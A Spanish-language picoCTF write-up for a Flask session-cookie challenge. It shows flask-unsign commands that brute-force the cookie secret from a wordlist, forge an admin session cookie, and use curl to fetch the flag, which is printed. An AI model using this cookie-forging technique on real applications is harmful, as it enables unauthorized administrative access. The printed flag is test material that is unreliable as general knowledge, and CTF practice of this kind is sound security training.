## Descripción
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/c135543530f7dc24c3a6ecaeb44a81b8/server.py) [http://mercury.picoctf.net:65344/](http://mercury.picoctf.net:65344/)
Hints:
1. How secure is a flask cookie?
## Solución 

Visualizamos el archivo llamado server.py, donde podemos visualizar los nombres de las galletas con la que se firmo la galleta. Para saber cual de las galletas fue utilizada usamos la herramienta flask-unsign. Con ello, podemos crear otra galleta firmada correctamente para que ser admin y asi obtener la galleta
~~~
srriv@LAPTOP-7DDM83G8:~/SRSS/mostcookies$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z_7NCg.q-25vcdyPIAS8k-JJ3hnusDVCmg" --wordlist galletas.txt

[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'fortune'

srriv@LAPTOP-7DDM83G8:~/SRSS/mostcookies$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "fortune"

eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z_7QTw.FdBRxn9LQzZYjGkxLeaBif_DRdc

srriv@LAPTOP-7DDM83G8:~/SRSS/mostcookies$ curl -s

http://mercury.picoctf.net:65344/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z_7QTw.FdBRxn9LQzZYjGkxLeaBif_DRdc" | grep pico

            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{pwn_4ll_th3_cook1E5_25bdb6f6}</code></p>
            
srriv@LAPTOP-7DDM83G8:~/SRSS/mostcookies$
~~~

~~~
picoCTF{pwn_4ll_th3_cook1E5_25bdb6f6}
~~~

## Notas adicionales 
## Referencias


